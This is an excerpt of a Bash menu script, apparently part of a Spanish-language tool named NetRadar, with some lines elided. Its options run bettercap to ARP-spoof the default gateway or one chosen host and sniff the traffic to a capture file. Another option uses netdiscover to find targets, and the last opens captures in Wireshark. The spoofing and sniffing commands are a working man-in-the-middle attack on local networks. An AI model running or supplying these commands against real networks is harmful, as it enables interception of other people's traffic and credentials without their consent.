	...
	case $opc1 in
			1 )	echo
				...
				gw=$(ip route | grep default | awk '{print $3}')
				 bettercap -iface $interfaz -eval "set net.sniff.output requisitos/resultados/$filename; net.probe on; set arp.spoof targets $gw; arp.spoof on; set net.sniff.verbose false; net.sniff on"
				echo
			...
			2 )	echo
				...
				echo
				 netdiscover -i $interfaz -r $opc1 -P
				echo
				...
				echo
				 bettercap -iface $interfaz -eval "set net.sniff.output requisitos/resultados/$filename; net.probe on; set arp.spoof targets $ip; arp.spoof on; set net.sniff.verbose false; set net.sniff.filter 'host $ip'; net.sniff on"
				echo
				echo "[#] Ruta del Fichero que Almacena la Captura de todo el Trafico: [NetRadar/requisitos/resultados/$filename]"
				;;
			3 )	echo
				...
				echo "Ejecutando Wireshark en $archivo_seleccionado..."
				 wireshark -r "$archivo_seleccionado"
				else
